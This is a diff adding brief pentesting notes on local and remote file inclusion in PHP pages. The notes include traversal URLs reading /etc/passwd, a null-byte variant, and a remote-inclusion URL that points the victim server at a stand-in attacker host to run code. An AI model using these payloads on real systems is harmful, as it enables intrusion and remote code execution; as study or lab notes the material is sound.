@@ -1,0 +1,21 @@
+Check parameters used to load information from/to other pages for this
+  First check should be /etc/passwd as this is commonly world readable.
+  More here for Linux: https://gracefulsecurity.com/path-traversal-cheat-sheet-linux/
+
+http://some-random-ass-ip/page.php?page=../../../../etc/passwd 
+  Will be different for Windows but a similar concept
+  https://gracefulsecurity.com/path-traversal-cheat-sheet-windows/
+
+PHP before 5.something (lost what specific version!) will terminate a given string if a null byte is encountered
+  http://some-random-ass-ip/page.php?page=../../../../etc/passwd%00 might work if the typical injection doesn't
+---
+RFI
+With LFI there's also the possibility of RFI- this will allow us to execute desired code on the victim server too.
+Create a test file and host it using python -m SimpleHTTPServer
+  http://some-random-ass-ip/page.php?page=http://our-random-ass-ip:random-ass-port/test.php
+If our file is returned to us, RFI is a thing and this gives us the ability of RCE: code will be executed by the victim server before being returned to us
+---
+There's also more here on different techniques to try to exploit a LFI vulnerability:
+  https://null-byte.wonderhowto.com/how-to/beat-lfi-restrictions-with-advanced-techniques-0198048/
+
+NOTE: Log poisoning is likely possible if log files are readable from the server
